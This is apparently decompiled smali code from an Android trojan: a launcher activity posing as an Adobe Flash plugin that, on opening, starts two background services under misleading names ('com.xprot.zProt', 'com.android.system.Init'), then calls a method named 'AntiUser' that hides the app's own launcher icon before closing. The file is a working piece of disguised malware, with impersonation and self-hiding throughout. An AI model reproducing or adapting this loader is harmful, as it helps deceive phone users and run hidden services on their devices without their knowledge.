.class public Lcom/adobe/flashplugin/Loader;
.super Landroid/app/Activity;
.source "Loader.java"


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation

.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/adobe/flashplugin/Loader$AvThere;
    }
.end annotation


# static fields
.field static xz:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 16
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static getContext()Landroid/content/Context;
    .locals 1

    .prologue
    .line 41
    sget-object v0, Lcom/adobe/flashplugin/Loader;->xz:Landroid/content/Context;

    .line 42
    .local v0, "c":Landroid/content/Context;
    return-object v0
.end method


# virtual methods
.method public AntiUser(Landroid/content/Context;)V
    .locals 5
    .param p1, "c"    # Landroid/content/Context;

    .prologue
    .line 48
    new-instance v0, Landroid/content/ComponentName;

    const-class v4, Lcom/adobe/flashplugin/Loader;

    invoke-direct {v0, p1, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 49
    .local v0, "P":Landroid/content/ComponentName;
    invoke-virtual {p0}, Lcom/adobe/flashplugin/Loader;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 50
    .local v2, "p":Landroid/content/pm/PackageManager;
    const/4 v1, 0x2

    .line 51
    .local v1, "cz":I
    const/4 v3, 0x1

    .line 52
    .local v3, "z":I
    new-instance v4, Lcom/adobe/flashplugin/Loader$AvThere;

    invoke-direct {v4, p0}, Lcom/adobe/flashplugin/Loader$AvThere;-><init>(Lcom/adobe/flashplugin/Loader;)V

    invoke-virtual {v4, v2, v0, v1, v3}, Lcom/adobe/flashplugin/Loader$AvThere;->Hide(Landroid/content/pm/PackageManager;Landroid/content/ComponentName;II)V

    .line 53
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 23
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 26
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/adobe/flashplugin/Loader;->setContentView(I)V

    .line 28
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/xprot/zProt;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplugin/Loader;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 30
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/android/system/Init;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplugin/Loader;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 32
    invoke-virtual {p0}, Lcom/adobe/flashplugin/Loader;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/adobe/flashplugin/Loader;->xz:Landroid/content/Context;

    .line 34
    invoke-virtual {p0}, Lcom/adobe/flashplugin/Loader;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/adobe/flashplugin/Loader;->AntiUser(Landroid/content/Context;)V

    .line 36
    invoke-virtual {p0}, Lcom/adobe/flashplugin/Loader;->finish()V

    .line 37
    return-void
.end method
